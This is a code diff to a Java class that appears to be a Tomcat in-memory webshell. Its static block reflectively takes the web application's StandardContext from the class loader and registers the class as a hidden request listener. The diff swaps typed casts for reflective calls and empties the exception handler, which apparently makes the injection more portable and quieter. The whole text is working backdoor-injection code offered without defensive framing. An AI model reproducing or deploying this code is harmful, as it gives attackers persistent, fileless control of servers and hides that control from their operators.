@@ -22,24 +22,25 @@ public class TomcatListenerContextClassMS implements ServletRequestListener {
     static {
         try {
             // 获取 standardContext
-            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-            org.apache.catalina.core.StandardContext standardContext;
+            Object webappClassLoaderBase = Thread.currentThread().getContextClassLoader();
+            Object standardContext;
             try {
                 Method getResourcesmethod = webappClassLoaderBase.getClass().getDeclaredMethod("getResources");
                 getResourcesmethod.setAccessible(true);
                 Object resources = getResourcesmethod.invoke(webappClassLoaderBase);
                 Method getContextmethod = resources.getClass().getDeclaredMethod("getContext");
                 getContextmethod.setAccessible(true);
-                standardContext = (org.apache.catalina.core.StandardContext) getContextmethod.invoke(resources);
+                standardContext = getContextmethod.invoke(resources);
             } catch (Exception ignored) {
                 Object root = getFieldValue(webappClassLoaderBase, "resources");
-                standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(root, "context");
+                standardContext = getFieldValue(root, "context");
             }
 
             TomcatListenerContextClassMS listenerMemShell = new TomcatListenerContextClassMS();
-            standardContext.addApplicationEventListener(listenerMemShell);
-        } catch (Exception ignored) {
-            ignored.printStackTrace();
+//            standardContext.addApplicationEventListener(listenerMemShell);
+            standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class).invoke(standardContext, listenerMemShell);
+
+        } catch (Exception e) {
         }
     }
 
